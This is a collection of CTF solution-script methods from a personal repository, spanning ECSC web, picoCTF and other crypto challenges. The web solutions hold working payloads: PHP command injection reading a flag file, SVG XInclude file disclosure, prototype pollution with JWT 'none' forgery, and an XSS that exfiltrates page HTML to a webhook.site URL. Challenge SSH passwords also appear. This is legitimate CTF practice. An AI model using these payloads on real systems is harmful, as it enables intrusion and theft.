        payload = &#39;Y-m-d&#34;); system(&#34;cat /flagxTtZD&#34;); //&#39;
        r = requests.get(url, params={&#34;format&#34;: payload})
        print(r.text)

        # /home/figaro/CTF/Categories/Web/ECSC/Memes/payloads/solution.py
    def main(self):
        self.new_url = f&#34;http://{self.url}:{self.port}/api/generate&#34;
        self.generating()

        # /home/figaro/CTF/Categories/Web/ECSC/Memes/payloads/solution.py
    def generating(self):

        exploit = f&#34;&#34;&#34;&lt;/text&gt;&lt;text x=\&#34;10\&#34; y=\&#34;50\&#34; font-size=\&#34;20\&#34; fill=\&#34;black\&#34; xmlns:xi=\&#34;http://www.w3.org/2001/XInclude\&#34;&gt;&lt;xi:include href=\&#34;.?../../../../app/flag.txt\&#34; parse=\&#34;text\&#34;/&gt;&lt;/text&gt;&lt;text&gt;
                &#34;&#34;&#34;

        payload = {
            &#34;name&#34;: &#34;everywhere&#34;,
            &#34;topText&#34;: exploit,
            &#34;bottomText&#34;: &#34;lol&#34;,
        }

        headers = {&#34;Content-Type&#34;: &#34;application/json&#34;}

        response = requests.post(self.new_url, json=payload, headers=headers)

        if response.status_code == 200 and &#34;result&#34; in response.json():
            self.meme = response.json()[&#34;result&#34;]
            self.meme_url = f&#34;http://{self.url}:{self.port}/{self.meme}&#34;
            print(self.meme_url)

        # /home/figaro/CTF/Categories/Web/ECSC/Memes/payloads/solution.py
    def downloading(self):
        if not hasattr(self, &#34;meme_url&#34;):
            print(&#34;Meme not generated. Please run the generating step first.&#34;)
            return
        response = requests.get(self.meme_url)
        meme_name = self.meme.split(&#34;/&#34;)[-1]
        if response.status_code == 200:
            with open(self.folfil(&#34;data&#34;, meme_name), &#34;wb&#34;) as f:
                f.write(response.content)
            print(&#34;Meme downloaded successfully.&#34;)
        else:
            print(&#34;Failed to download the meme.&#34;)

        # /home/figaro/CTF/Categories/Web/ECSC/Memes/payloads/attempt_01.py
    def main(self):
        self.new_url = f&#34;http://{self.url}:{self.port}/api/generate&#34;
        self.generating()

        # /home/figaro/CTF/Categories/Web/ECSC/Memes/payloads/attempt_01.py
    def generating(self):

        # exploit = &#34;&#34;&#34;M&lt;/text&gt;&lt;image x=&#34;0&#34; y=&#34;250&#34; width=&#34;500&#34; height=&#34;250&#34; href=&#34;file:///app/flag.txt&#34;/&gt;&lt;text x=&#34;50%&#34; y=&#34;45&#34; font-size=&#34;40&#34; fill=&#34;blue&#34; stroke=&#34;red&#34;&gt;A&#34;&#34;&#34;

        # filename = &#34;static/memes/doge.png&#34;

        # exploit = f&#34;&#34;&#34;M&lt;/text&gt;&lt;image x=&#34;10&#34; y=&#34;0&#34; width=&#34;50&#34; height=&#34;50&#34; href=&#34;file://{filename}&#34;/&gt;&lt;text x=&#34;50%&#34; y=&#34;45&#34; font-size=&#34;40&#34; fill=&#34;blue&#34; stroke=&#34;red&#34;&gt;A&#34;&#34;&#34;

        online_meme_url = f&#34;http://{self.url}:{self.port}/memes/doge&#34;

        # exploit = f&#34;&#34;&#34;M&lt;/text&gt;&lt;image x=&#34;0&#34; y=&#34;0&#34; width=&#34;500&#34; height=&#34;250&#34; href=&#34;{online_meme_url}&#34;/&gt;&lt;text x=&#34;50%&#34; y=&#34;45&#34; font-size=&#34;40&#34; fill=&#34;red&#34; stroke=&#34;red&#34;&gt;A&#34;&#34;&#34;

        # filename = &#34;/flag.txt&#34;
        # filename = base64.b64encode(filename.encode()).decode()
        # data:image/png;base64,
        # exploit = f&#34;&#34;&#34;M&lt;/text&gt;&lt;g id=&#34;foreground&#34;&gt;&lt;image x=&#34;0&#34; y=&#34;0&#34; width=&#34;50&#34; height=&#34;50&#34; href=&#34;data:image/png;base64,{filename}&#34;/&gt;&lt;/g&gt;&lt;text x=&#34;50%&#34; y=&#34;45&#34;  fill=&#34;blue&#34; stroke=&#34;red&#34;&gt;A&#34;&#34;&#34;
        # exploit = f&#34;&#34;&#34;M&lt;/text&gt;&lt;image x=&#34;0&#34; y=&#34;0&#34; width=&#34;50&#34; height=&#34;50&#34; href=&#34;data:image/png;base64,{filename}&#34;/&gt;&lt;text x=&#34;50%&#34; y=&#34;45&#34;  fill=&#34;blue&#34; stroke=&#34;red&#34;&gt;A&#34;&#34;&#34;
        # exploit = f&#34;&#34;&#34;M&lt;/text&gt;&lt;image x=&#34;0&#34; y=&#34;0&#34; width=&#34;50&#34; height=&#34;50&#34; href=&#34;data:image/png;base64,{filename}&#34;/&gt;&lt;text y=&#34;45&#34;&gt;A&#34;&#34;&#34;

        filename = &#34;/flag.txt&#34;

        # exploit = f&#34;&#34;&#34;&lt;/text&gt;&lt;foreignObject&gt;&lt;iframe  src=&#34;file://{filename}&#34;/&gt;&lt;/foreignObject&gt;&lt;text y=&#34;45&#34;&gt;A&#34;&#34;&#34;
        exploit = f&#34;&#34;&#34;&lt;/text&gt;&lt;foreignObject&gt;&lt;iframe  src=&#34;{online_meme_url}&#34;/&gt;&lt;/foreignObject&gt;&lt;text y=&#34;45&#34;&gt;A&#34;&#34;&#34;

        # exploit = f&#34;&#34;&#34;M&lt;/text&gt;&lt;g id=&#34;foreground&#34;&gt;&lt;image x=&#34;0&#34; y=&#34;0&#34; width=&#34;50&#34; height=&#34;50&#34; href=&#34;data:image/png;base64,{filename}&#34;/&gt;&lt;/g&gt;&lt;text x=&#34;50%&#34; y=&#34;45&#34;  fill=&#34;blue&#34; stroke=&#34;red&#34;&gt;A&#34;&#34;&#34;

        print(len(exploit))
        print(exploit)

        payload = {
            &#34;name&#34;: &#34;everywhere&#34;,
            # &#34;name&#34;: &#34;doge&#34;,
            &#34;topText&#34;: &#34;lol&#34;,
            &#34;bottomText&#34;: exploit,
        }

        headers = {&#34;Content-Type&#34;: &#34;application/json&#34;}

        response = requests.post(self.new_url, json=payload, headers=headers)

        if response.status_code == 200 and &#34;result&#34; in response.json():
            self.meme = response.json()[&#34;result&#34;]
            self.meme_url = f&#34;http://{self.url}:{self.port}/{self.meme}&#34;
            print(self.meme_url)

        # /home/figaro/CTF/Categories/Web/ECSC/Memes/payloads/attempt_01.py
    def downloading(self):
        if not hasattr(self, &#34;meme_url&#34;):
            print(&#34;Meme not generated. Please run the generating step first.&#34;)
            return
        response = requests.get(self.meme_url)
        meme_name = self.meme.split(&#34;/&#34;)[-1]
        if response.status_code == 200:
            with open(self.folfil(&#34;data&#34;, meme_name), &#34;wb&#34;) as f:
                f.write(response.content)
            print(&#34;Meme downloaded successfully.&#34;)
        else:
            print(&#34;Failed to download the meme.&#34;)

        # /home/figaro/CTF/Categories/Web/ECSC/Popcorn_and_Payloads/payloads/solution.py
    def main(self):
        self.completed_url = f&#34;http://{self.url}:{self.port}&#34;

        # /home/figaro/CTF/Categories/Web/ECSC/Missing_Essence/payloads/solution.py
    def create_token(self, username):
        header = {&#34;alg&#34;: &#34;none&#34;, &#34;typ&#34;: &#34;JWT&#34;}
        return jwt.encode(
            {&#34;username&#34;: username}, key=None, algorithm=&#34;none&#34;, headers=header
        )

        # /home/figaro/CTF/Categories/Web/ECSC/Missing_Essence/payloads/solution.py
    def pollute(self, base_url):
        payload = {
            &#34;user.username&#34;: &#34;nikolas&#34;,
            &#34;user.password&#34;: &#34;nikolas&#34;,
            &#34;user.__proto__.payloads&#34;: [&#34;none&#34;],
            &#34;user.__proto__.authKeyFile&#34;: True,
        }
        r = requests.post(f&#34;{base_url}/api/register&#34;, json=payload)

        # /home/figaro/CTF/Categories/Web/ECSC/Missing_Essence/payloads/solution.py
    def main(self):
        self.base_url = f&#34;http://{self.url}:{self.port}&#34;
        cookie = self.create_token(&#34;admin&#34;)
        headers = {&#34;Cookie&#34;: f&#34;session={cookie}&#34;}
        print(cookie)
        self.pollute(self.base_url)
        req = requests.get(f&#34;{self.base_url}/panel&#34;, headers=headers)
        flag = self.re_match_partial_flag(text=req.text, origin=&#34;ECSC&#34;)
        print(flag)

        # /home/figaro/CTF/Categories/Web/ECSC/CheesyWeb/payloads/solution.py
    def generate_payload(self, attacker_url):
        payload = &#34;&#34;&#34;
        &lt;script&gt;
        const iframe = document.createElement(&#39;iframe&#39;);
        iframe.srcdoc = `
        &lt;script&gt;
        window.parent.postMessage({
            style: {
            &#34;webkitUserModify&#34;: &#34;read-write&#34;
            }
        }, &#39;*&#39;);
        &lt;\\/script&gt;
    `;
        document.body.appendChild(iframe);

        setTimeout(() =&gt; {
            window.find(&#39;Here&#39;);
            document.execCommand(&#39;insertHTML&#39;, false, `&lt;img src=x onerror=&#34;fetch(&#39;EXFIL_URL&#39;+this.parentElement.outerHTML)&#34;&gt;`)
        }, 1000);
        &lt;/script&gt;
        &#34;&#34;&#34;.replace(
            &#34;EXFIL_URL&#34;, attacker_url
        )

        return payload

        # /home/figaro/CTF/Categories/Web/ECSC/CheesyWeb/payloads/solution.py
    def generate_url(self, attacker_url, payload):
        &#34;&#34;&#34;
        Description:
            Generate a URL with the given attacker URL and payload.

        Args:
            attacker_url (_type_): _description_
            payload (_type_): _description_

        Returns:
            _type_: _description_
        &#34;&#34;&#34;
        base_url = &#34;http://localhost/index.php&#34;

        parsed_url = urllib.parse.quote(payload)
        print(parsed_url)
        params_suffix = &#34;&amp;p=1&#34; * 1500
        return f&#34;{base_url}?xss={parsed_url}{params_suffix}&#34;

        # /home/figaro/CTF/Categories/Web/ECSC/CheesyWeb/payloads/solution.py
    def send_to_bot(self, payload_url):
        &#34;&#34;&#34;
        Description:
            Send the payload URL to the bot.

        Args:
            payload_url (_type_): _description_

        Returns:
            _type_: _description_
        &#34;&#34;&#34;
        headers = {&#34;Content-Type&#34;: &#34;application/x-www-form-urlencoded&#34;}
        data = {&#34;url&#34;: payload_url}
        response = requests.post(self.bot_url, headers=headers, data=data)
        return response.text

        # /home/figaro/CTF/Categories/Web/ECSC/CheesyWeb/payloads/solution.py
    def main(self):
        self.url_ful = f&#34;http://{self.url}:{self.port}&#34;
        self.base_url = f&#34;{self.url_ful}/index.php&#34;
        self.bot_url = f&#34;{self.url_ful}/bot.php&#34;

        attacker_url = &#34;https://webhook.site/73ea9e99-e3cc-4b42-a040-4c7c107406b6?leak=&#34;
        payload = self.generate_payload(attacker_url)
        payload_url = self.generate_url(attacker_url, payload)
        response = self.send_to_bot(payload_url)
        print(response)

        # /home/figaro/CTF/Categories/General/picoCTF/SansAlpha/payloads/solution.py
    def main(self):
        user = &#34;ctf-player&#34;
        host = &#34;mimas.picoctf.net&#34;
        port = 50399
        password = &#34;6dd28e9b&#34;

        self.conn = self.pwn.ssh(user, host, port, password)

        # print(repr(self.conn(&#34;ls&#34;)))
        self.conn.interactive(&#34;/bin/sh&#34;)

        # /home/figaro/CTF/Categories/General/picoCTF/Special/payloads/solution.py
    def main(self):
        self.password = &#34;8a707622&#34;
        self.user = &#34;ctf-player&#34;
        self.host = &#34;saturn.picoctf.net&#34;
        self.port = 54157

        self.ssh_connect(
            user=self.user, host=self.host, port=self.port, password=self.password
        )
        self.interactive()

        # /home/figaro/CTF/Categories/General/picoCTF/Special/payloads/solution.py
    def ssh_connect(self, **kwargs):
        &#34;&#34;&#34;
        Descrption : Establish SSH connection
        Parameters :
            - user : username
            - host : hostname
            - port : port number
            - password : password

        Returns : None
        &#34;&#34;&#34;
        user = kwargs.get(&#34;user&#34;, self.user)
        host = kwargs.get(&#34;host&#34;, self.host)
        port = kwargs.get(&#34;port&#34;, self.port)
        password = kwargs.get(&#34;password&#34;, self.password)

        if any([user is None, host is None, port is None, password is None]):
            raise &#34;Invalid SSH connection parameters&#34;
            return

        self.ssh_connection = self.pwn.ssh(user, host, port, password)

        # /home/figaro/CTF/Categories/General/picoCTF/Special/payloads/solution.py
    def interactive(self):
        &#34;&#34;&#34;
        Descrption : Start an interactive session
        Parameters : None
        Returns : None
        &#34;&#34;&#34;
        self.ssh_connection.interactive()

        # /home/figaro/CTF/Categories/General/picoCTF/ASCII_Numbers/payloads/solution.py
    def from_hex(self, hex_string):
        return bytes.fromhex(hex_string).decode(&#34;utf-8&#34;)

        # /home/figaro/CTF/Categories/General/picoCTF/ASCII_Numbers/payloads/solution.py
    def hex_to_string(self, hex_string):
        &#34;&#34;&#34;
        Description: Convert hex string to ascii string

        Analytical:
        - Split the hex string by space
        - Convert each hex value to ascii character
        - Join the ascii characters to form the ascii string

        Args:
            hex_string (str): Hex string to convert to ascii

        Returns:
            str: Ascii string
        &#34;&#34;&#34;
        hex_string = hex_string.split(&#34; &#34;)
        return &#34;&#34;.join([chr(int(i, 16)) for i in hex_string])

        # /home/figaro/CTF/Categories/General/picoCTF/ASCII_Numbers/payloads/solution.py
    def main(self):
        with open(self.challenge_file, &#34;r&#34;) as f:
            data = f.read().strip()

        flag = self.hex_to_string(data)

        print(flag)

        # /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_5/payloads/solution.py
    def str_xor(self, secret, key):
        # extend key to secret length
        new_key = key
        i = 0
        while len(new_key) &lt; len(secret):
            new_key = new_key + key[i]
            i = (i + 1) % len(key)
        return &#34;&#34;.join(
            [
                chr(ord(secret_c) ^ ord(new_key_c))
                for (secret_c, new_key_c) in zip(secret, new_key)
            ]
        )

        # /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_5/payloads/solution.py
    def hash_pw(self, pw_str):
        pw_bytes = bytearray()
        pw_bytes.extend(pw_str.encode())
        m = hashlib.md5()
        m.update(pw_bytes)
        return m.digest()

        # /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_5/payloads/solution.py
    def bruteforcing(self):
        for pw in self.pos_pw_list:
            user_pw_hash = self.hash_pw(pw)
            if user_pw_hash == self.correct_pw_hash:
                return pw

        # /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_5/payloads/solution.py
    def main(self):
        dictionary = self.Path(self.folder_files, &#34;dictionary.txt&#34;)
        with open(dictionary, &#34;r&#34;) as f:
            self.pos_pw_list = f.read().splitlines()
        file_hash = self.Path(self.folder_files, &#34;level5.hash.bin&#34;)
        with open(file_hash, &#34;rb&#34;) as f:
            self.correct_pw_hash = f.read()

        with open(self.challenge_file, &#34;rb&#34;) as f:
            self.flag_enc = f.read()

        pw = self.bruteforcing()
        flag = self.str_xor(self.flag_enc.decode(), pw)
        print(flag)

        # /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_3/payloads/solution.py
    def str_xor(self, secret, key):
        # extend key to secret length
        new_key = key
        i = 0
        while len(new_key) &lt; len(secret):
            new_key = new_key + key[i]
            i = (i + 1) % len(key)
        return &#34;&#34;.join(
            [
                chr(ord(secret_c) ^ ord(new_key_c))
                for (secret_c, new_key_c) in zip(secret, new_key)
            ]
        )

        # /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_3/payloads/solution.py
    def hash_pw(self, pw_str):
        pw_bytes = bytearray()
        pw_bytes.extend(pw_str.encode())
        m = hashlib.md5()
        m.update(pw_bytes)
        return m.digest()

        # /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_3/payloads/solution.py
    def bruteforcing(self):
        for pw in self.pos_pw_list:
            user_pw_hash = self.hash_pw(pw)
            if user_pw_hash == self.correct_pw_hash:
                return pw

        # /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_3/payloads/solution.py
    def main(self):
        self.pos_pw_list = [&#34;8799&#34;, &#34;d3ab&#34;, &#34;1ea2&#34;, &#34;acaf&#34;, &#34;2295&#34;, &#34;a9de&#34;, &#34;6f3d&#34;]
        file_hash = self.Path(self.folder_files, &#34;level3.hash.bin&#34;)
        with open(file_hash, &#34;rb&#34;) as f:
            self.correct_pw_hash = f.read()

        with open(self.challenge_file, &#34;rb&#34;) as f:
            self.flag_enc = f.read()

        pw = self.bruteforcing()
        flag = self.str_xor(self.flag_enc.decode(), pw)
        print(flag)

        # /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_4/payloads/solution.py
    def str_xor(self, secret, key):
        # extend key to secret length
        new_key = key
        i = 0
        while len(new_key) &lt; len(secret):
            new_key = new_key + key[i]
            i = (i + 1) % len(key)
        return &#34;&#34;.join(
            [
                chr(ord(secret_c) ^ ord(new_key_c))
                for (secret_c, new_key_c) in zip(secret, new_key)
            ]
        )

        # /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_4/payloads/solution.py
    def hash_pw(self, pw_str):
        pw_bytes = bytearray()
        pw_bytes.extend(pw_str.encode())
        m = hashlib.md5()
        m.update(pw_bytes)
        return m.digest()

        # /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_4/payloads/solution.py
    def bruteforcing(self):
        for pw in self.pos_pw_list:
            user_pw_hash = self.hash_pw(pw)
            if user_pw_hash == self.correct_pw_hash:
                return pw

        # /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_4/payloads/solution.py
    def main(self):
        self.pos_pw_list = [
            &#34;158f&#34;,
            &#34;1655&#34;,
            &#34;d21e&#34;,
            &#34;4966&#34;,
            &#34;ed69&#34;,
            &#34;1010&#34;,
            &#34;dded&#34;,
            &#34;844c&#34;,
            &#34;40ab&#34;,
            &#34;a948&#34;,
            &#34;156c&#34;,
            &#34;ab7f&#34;,
            &#34;4a5f&#34;,
            &#34;e38c&#34;,
            &#34;ba12&#34;,
            &#34;f7fd&#34;,
            &#34;d780&#34;,
            &#34;4f4d&#34;,
            &#34;5ba1&#34;,
            &#34;96c5&#34;,
            &#34;55b9&#34;,
            &#34;8a67&#34;,
            &#34;d32b&#34;,
            &#34;aa7a&#34;,
            &#34;514b&#34;,
            &#34;e4e1&#34;,
            &#34;1230&#34;,
            &#34;cd19&#34;,
            &#34;d6dd&#34;,
            &#34;b01f&#34;,
            &#34;fd2f&#34;,
            &#34;7587&#34;,
            &#34;86c2&#34;,
            &#34;d7b8&#34;,
            &#34;55a2&#34;,
            &#34;b77c&#34;,
            &#34;7ffe&#34;,
            &#34;4420&#34;,
            &#34;e0ee&#34;,
            &#34;d8fb&#34;,
            &#34;d748&#34;,
            &#34;b0fe&#34;,
            &#34;2a37&#34;,
            &#34;a638&#34;,
            &#34;52db&#34;,
            &#34;51b7&#34;,
            &#34;5526&#34;,
            &#34;40ed&#34;,
            &#34;5356&#34;,
            &#34;6ad4&#34;,
            &#34;2ddd&#34;,
            &#34;177d&#34;,
            &#34;84ae&#34;,
            &#34;cf88&#34;,
            &#34;97a3&#34;,
            &#34;17ad&#34;,
            &#34;7124&#34;,
            &#34;eff2&#34;,
            &#34;e373&#34;,
            &#34;c974&#34;,
            &#34;7689&#34;,
            &#34;b8b2&#34;,
            &#34;e899&#34;,
            &#34;d042&#34;,
            &#34;47d9&#34;,
            &#34;cca9&#34;,
            &#34;ab2a&#34;,
            &#34;de77&#34;,
            &#34;4654&#34;,
            &#34;9ecb&#34;,
            &#34;ab6e&#34;,
            &#34;bb8e&#34;,
            &#34;b76b&#34;,
            &#34;d661&#34;,
            &#34;63f8&#34;,
            &#34;7095&#34;,
            &#34;567e&#34;,
            &#34;b837&#34;,
            &#34;2b80&#34;,
            &#34;ad4f&#34;,
            &#34;c514&#34;,
            &#34;ffa4&#34;,
            &#34;fc37&#34;,
            &#34;7254&#34;,
            &#34;b48b&#34;,
            &#34;d38b&#34;,
            &#34;a02b&#34;,
            &#34;ec6c&#34;,
            &#34;eacc&#34;,
            &#34;8b70&#34;,
            &#34;b03e&#34;,
            &#34;1b36&#34;,
            &#34;81ff&#34;,
            &#34;77e4&#34;,
            &#34;dbe6&#34;,
            &#34;59d9&#34;,
            &#34;fd6a&#34;,
            &#34;5653&#34;,
            &#34;8b95&#34;,
            &#34;d0e5&#34;,
        ]

        file_hash = self.Path(self.folder_files, &#34;level4.hash.bin&#34;)
        with open(file_hash, &#34;rb&#34;) as f:
            self.correct_pw_hash = f.read()

        with open(self.challenge_file, &#34;rb&#34;) as f:
            self.flag_enc = f.read()

        pw = self.bruteforcing()
        flag = self.str_xor(self.flag_enc.decode(), pw)
        print(flag)

        # /home/figaro/CTF/Categories/Cryptography/picoCTF/ReadMyCert/payloads/solution.py
    def parse_csr(self):
        with open(self.challenge_file, &#34;rb&#34;) as f:
            csr_data = f.read()

        csr = crypto.load_certificate_request(crypto.FILETYPE_PEM, csr_data)
        # Print the parsed CSR
        for i in range(csr.get_subject().get_components().__len__()):
            print(csr.get_subject().get_components()[i])

        # /home/figaro/CTF/Categories/Cryptography/picoCTF/ReadMyCert/payloads/solution.py
    def main(self):
        self.parse_csr()

        # /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def main(self):
        with open(self.challenge_file, &#34;r&#34;) as f:
            enc_flag_data = f.read().strip().split(&#34;\n&#34;)

        a = enc_flag_data[0].split(&#34; = &#34;)[1]
        b = enc_flag_data[1].split(&#34; = &#34;)[1]
        cipher = enc_flag_data[2].split(&#34;: &#34;)[1].strip(&#34;[]&#34;).split(&#34;, &#34;)
        a = int(a)
        b = int(b)
        cipher = [int(c) for c in cipher]

        p = self.finding_next_prime(a)
        g = self.finding_next_prime(b)

        u = self.generator(g, a, p)
        v = self.generator(g, b, p)

        key = self.generator(v, a, p)
        b_key = self.generator(u, b, p)
        if key == b_key:
            shared_key = key

        # print(shared_key)
        semi_plaintext = self.decrypt(cipher, shared_key)
        tex_key = &#34;trudeau&#34;

        flag = self.dynamic_xor_decrypt(&#34;&#34;.join(semi_plaintext), tex_key)
        flag = flag[::-1]
        print(flag)

        # /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def generator(self, g, x, p):
        return pow(g, x) % p

        # /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def is_prime(self, p):
        v = 0
        for i in range(2, p + 1):
            if p % i == 0:
                v = v + 1
        if v &gt; 1:
            return False
        else:
            return True

        # /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def finding_next_prime(self, number, n=None):
        if n:
            for _ in range(number, number + n):
                if self.is_prime(number):
                    return number
        else:
            while True:
                number = number + 1
                if self.is_prime(number):
                    return number

        # /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def dynamic_xor_encrypt(self, plaintext, text_key):
        cipher_text = &#34;&#34;
        key_length = len(text_key)
        for i, char in enumerate(plaintext[::-1]):
            key_char = text_key[i % key_length]
            encrypted_char = chr(ord(char) ^ ord(key_char))
            cipher_text += encrypted_char
        return cipher_text

        # /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def dynamic_xor_decrypt(self, plaintext, text_key):
        cipher_text = &#34;&#34;
        key_length = len(text_key)
        for i, char in enumerate(plaintext):
            key_char = text_key[i % key_length]
            encrypted_char = chr(ord(char) ^ ord(key_char))
            cipher_text += encrypted_char
        return cipher_text

        # /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def encrypt(self, plaintext, key):
        cipher = []
        for char in plaintext:
            cipher.append(((ord(char) * key * 311)))
        return cipher

        # /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def decrypt(self, cipher_list, key):
        plaintext = []
        for char in cipher_list:
            plaintext.append(chr(int(char / key / 311)))
        return plaintext

        # /home/figaro/CTF/Categories/Cryptography/picoCTF/basic_mod1/payloads/solution.py
    def get_message(self):
        with open(self.challenge_file, &#34;r&#34;) as f:
            self.message_data = f.read().strip()

        # /home/figaro/CTF/Categories/Cryptography/picoCTF/basic_mod1/payloads/solution.py
    def context(self, number):
        if 0 &lt;= number &lt;= 25:
            # Uppercase
            return chr(ord(&#34;A&#34;) + number)
        elif 26 &lt;= number &lt;= 35:
            # Numbers
            return chr(ord(&#34;0&#34;) + number - 26)
        elif number == 36:
            return &#34;_&#34;
        else:
            return str(number)

        # /home/figaro/CTF/Categories/Cryptography/picoCTF/basic_mod1/payloads/solution.py
    def main(self):
        self.get_message()

        flag = [self.context(int(i) % 37) for i in self.message_data.split(&#34; &#34;)]

        flag = &#34;&#34;.join(flag)

        flag = &#34;picoCTF{&#34; + flag + &#34;}&#34;

        print(flag)

        # /home/figaro/CTF/Categories/Cryptography/bsides/ViSquared/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.passwords_source = b64decode(
            b&#34;aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2RhbmllbG1pZXNzbGVyL1NlY0xpc3RzL21hc3Rlci9QYXNzd29yZHMvQ29tbW9uLUNyZWRlbnRpYWxzLzEway1tb3N0LWNvbW1vbi50eHQ=&#34;
        ).decode()

        # /home/figaro/CTF/Categories/Cryptography/bsides/ViSquared/payloads/solution.py
    def get_online_passwords(self):
        r = requests.get(self.passwords_source)
        self.password_list = r.text.split(&#34;\n&#34;)

        # /home/figaro/CTF/Categories/Cryptography/bsides/ViSquared/payloads/solution.py
    def decrypting_vigenere(self, ciphertext, key):
        key = key.lower()
        plaintext = &#34;&#34;
        for i, ch in enumerate(ciphertext):
            if ch.isalpha():
                nch = ord(ch) - 97
                nk = ord(key[i % len(key)]) - 97
                plaintext += chr((nch - nk + 26) % 26 + 97)
            else:
                plaintext += ch
        return plaintext

        # /home/figaro/CTF/Categories/Cryptography/bsides/ViSquared/payloads/solution.py
    def brute_force(
        self,
        ciphertext,
        password_list,
        cleartext: str = None,
        verbose: bool = False,
        tryall=False,
    ):

        for i, password in enumerate(password_list):
            if password.strip() == &#34;&#34;:
                continue

            if verbose:
                if i % 100 == 0:
                    print(f&#34;Trying password {i+1}/{len(password_list)}: {password}&#34;)

            decrypted = ciphertext
            for _ in range(2):

                decrypted = self.decrypting_vigenere(decrypted, password)

            if cleartext is not None:
                if cleartext in decrypted:
                    if verbose:
                        print(f&#34;Found password: {password}&#34;)
                        print(f&#34;Decrypted text: {decrypted}&#34;)
                    if not tryall:
                        return password, decrypted
            else:
                if decrypted.isprintable() and len(decrypted) &gt; 10:
                    if verbose:
                        print(f&#34;Found valid password: {password}&#34;)
                        print(f&#34;Decrypted text: {decrypted}&#34;)
                    # return password, decrypted

        if verbose:
            print(&#34;No valid password found.&#34;)
        return None, None

        # /home/figaro/CTF/Categories/Cryptography/bsides/ViSquared/payloads/solution.py
    def main(self):

        with open(self.challenge_file, &#34;r&#34;) as f:
            ciphertext = f.read().strip()

        self.get_online_passwords()
        print(&#34;Starting brute force...&#34;)

        password, decrypted_text = self.brute_force(
            ciphertext,
            password_list=self.password_list,
            cleartext=&#34;htb&#34;,
            verbose=True,
            tryall=True,
        )

        # /home/figaro/CTF/Categories/Cryptography/CSCG/Insecure/payloads/solution.py
    def main(self):
        e = 65537
        n = 1034776851837418228051242693253376923
        c = 1006234941664191676977296641660749407

        # from factordb.com
        p = 1086027579223696553
        q = 952809000096560291

        # Calculations start here
        phi = (p - 1) * (q - 1)

        d = inverse(e, phi)

        decrypted_m = pow(c, d, n)
        # print(decrypted_m)
        print(&#34;csc{&#34; + str(decrypted_m) + &#34;}&#34;)

        # /home/figaro/CTF/Categories/Cryptography/ReplyCode/KeiPybAras_Revenge/payloads/solution.py
    def main(self):

        # Known plaintext
        test = b&#34;Capybara friends, mission accomplished! We&#39;ve caused a blackout, let&#39;s meet at the bar to celebrate!&#34;

        # Parse from output file
        with open(self.folfil(&#34;files&#34;, &#34;output.txt&#34;), &#34;r&#34;) as f:
            contents = f.read().split(&#34;\n&#34;)

        test_dt, test_ts, test_cipher = contents[0].split(&#34; &#34;)
        test_cipher = bytes.fromhex(test_cipher)

        flag_dt, flag_ts, flag_cipher = contents[1].split(&#34; &#34;)
        flag_cipher = bytes.fromhex(flag_cipher)

        # Get test cipher and flag cipher timestamp hashes

        test_ts = int(
            (
                cal.timegm(t.strptime(test_dt + &#34; &#34; + test_ts, &#34;%Y-%m-%d %H:%M:%S.%f&#34;))
                + float(&#34;.&#34; + test_ts.split(&#34;.&#34;)[1])
            )
            * 1000
        ).to_bytes(16, byteorder=&#34;big&#34;)
        test_ts = md5(test_ts).digest()

        flag_ts = int(
            (
                cal.timegm(t.strptime(flag_dt + &#34; &#34; + flag_ts, &#34;%Y-%m-%d %H:%M:%S.%f&#34;))
                + float(&#34;.&#34; + flag_ts.split(&#34;.&#34;)[1])
            )
            * 1000
        ).to_bytes(16, byteorder=&#34;big&#34;)
        flag_ts = md5(flag_ts).digest()

        # Divide ciphers into blocks
        test_blocks = [test_cipher[i : i + 16] for i in range(0, len(test_cipher), 16)]
        flag_blocks = [flag_cipher[i : i + 16] for i in range(0, len(flag_cipher), 16)]

        # Reverse the xor by timestamp
        test_dexored = b&#34;&#34;
        for block in test_blocks:
            block_with_xor = bytes(a ^ b for a, b in zip(block, test_ts))
            test_dexored += block_with_xor

        flag_dexored = b&#34;&#34;
        for block in flag_blocks:
            block_with_xor = bytes(a ^ b for a, b in zip(block, flag_ts))
            flag_dexored += block_with_xor

        # Extract key from known plaintext
        key = bytes(a ^ b for a, b in zip(test, test_dexored))

        # Decrypt flag
        flag = bytes(a ^ b for a, b in zip(key, flag_dexored))

        print(key)
        print(flag)

        # The XOR of two ciphertexts (output from your previous step)
        # cipher_xor = b&#34;~I\x9c\x9a\xdd\x83\xe2\x9e\xd4@\x18\x84\xbd~\xec B\xf67\xbf...&#34;

        cipher_xor = flag

        # Known part of the flag (assuming it&#39;s at the beginning)
        known_flag = b&#34;FLG&#34;

        # XOR the known flag with the first bytes of the ciphertext XOR result
        keystream_guess = self.xor_bytes(cipher_xor[: len(known_flag)], known_flag)

        # Use the guessed keystream to decrypt more of one plaintext
        possible_plaintext = self.xor_bytes(
            cipher_xor, keystream_guess * (len(cipher_xor) // len(keystream_guess) + 1)
        )

        print(&#34;Recovered plaintext guess:&#34;, possible_plaintext.decode(errors=&#34;ignore&#34;))

        # /home/figaro/CTF/Categories/Cryptography/ReplyCode/KeiPybAras_Revenge/payloads/solution.py
    def xor_bytes(self, a, b):
